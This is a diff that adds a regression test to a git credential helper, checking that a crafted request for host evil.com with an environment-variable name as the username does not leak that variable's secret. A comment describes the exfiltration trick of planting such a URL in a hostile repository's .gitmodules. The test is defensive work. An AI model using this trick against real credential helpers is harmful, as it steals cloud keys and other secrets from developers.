@@ -83,3 +83,17 @@ def test_unusable_host_yields_no_credential(
     assert rc == 0
     assert out == ""
     assert "bad/host" not in out
+
+
+def test_get_never_resolves_an_environment_variable(
+    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    # A crafted git request -- host = an attacker's domain, username = a victim env var name -- must
+    # NOT exfiltrate the environment value. The helper reads the host-scoped STORE only, never the
+    # global environment tier of Credentials.secret(). (`https://SNEAKY_CLOUD_KEY@evil.com/` planted
+    # in a hostile repo's .gitmodules would otherwise send the env value to evil.com as Basic auth.)
+    monkeypatch.setenv("SNEAKY_CLOUD_KEY", "AKIA-SUPER-SECRET")
+    rc, out, err = _run(monkeypatch, capsys, "get", "host=evil.com\nusername=SNEAKY_CLOUD_KEY\n\n")
+    assert rc == 0
+    assert out == ""
+    assert "AKIA-SUPER-SECRET" not in out + err
